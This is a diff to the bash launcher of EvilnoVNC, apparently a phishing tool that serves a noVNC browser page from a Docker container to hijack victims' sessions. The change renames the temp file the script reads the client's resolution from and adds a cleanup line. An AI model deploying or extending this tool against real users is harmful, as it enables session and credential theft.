@@ -39,10 +39,11 @@ if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
 sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi
 
 if [[ $RESOLUTION == dynamic ]]; then
+sudo rm -f /tmp/client_info.txt > /dev/null 2>&1
 sudo rm -f /tmp/res*.txt > /dev/null 2>&1
 sudo docker run -d --rm -p 80:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
 
-else echo $RESOLUTION > /tmp/resolution.txt
+else echo {RESOLUTION: $RESOLUTION } > /tmp/client_info.txt
 sudo docker run -d --rm -p 80:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1 ; fi
 
 printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 2
@@ -51,8 +52,8 @@ printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2
 
 if [[ $RESOLUTION == dynamic ]]; then
 printf "\n\e[1;32m[+] Waiting for any user interaction.." ; sleep 2
-while [[ ! -f /tmp/resolution.txt ]]; do sleep 5 ; done
-RESOLUTION=$(head -1 /tmp/resolution.txt)
+while [[ ! -f /tmp/client_info.txt ]]; do sleep 5 ; done
+RESOLUTION=$(head -1 /tmp/client_info.txt)
 
 else printf "\n\e[1;32m[+] Avoiding dynamic resolution steps.." ; sleep 2 ; fi
 printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
